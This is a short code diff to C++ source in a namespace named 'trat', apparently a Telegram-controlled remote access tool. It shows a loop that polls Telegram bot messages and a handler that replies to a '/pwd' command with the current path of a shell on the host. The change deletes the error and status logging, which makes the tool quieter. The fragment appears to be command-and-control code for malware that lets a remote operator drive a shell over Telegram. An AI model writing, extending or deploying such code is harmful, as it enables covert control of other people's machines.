@@ -8,23 +8,16 @@ namespace trat
         int offset = -1;
         telebot_update_type_e update_types[] = {TELEBOT_UPDATE_TYPE_MESSAGE};
         telebot_error_e ret;
-
         while (true)
         {
             telebot_update_t* updates;
             int count;
-
-            // Fetch updates from Telegram
             ret = telebot_get_updates(handle, offset, 20, 0, update_types, 1, &updates, &count);
-
             if (ret != TELEBOT_ERROR_NONE)
             {
-                std::cerr << "Error fetching updates: " << ret << std::endl;
                 std::this_thread::sleep_for(std::chrono::seconds(2));
                 continue;
             }
-
-            std::cout << "Number of updates: " << count << std::endl;
 
             for (int i = 0; i < count; ++i)
             {
@@ -51,7 +44,7 @@ namespace trat
                             if (strstr(message.text, "/pwd"))
                             {
                                 std::thread([this]() {
-                                    this->sendMessage(this -> p_shell -> getCurrentPath());
+                                    this->sendMessage(( this -> shell).getCurrentPath());
                                 }).detach();
                             }
 
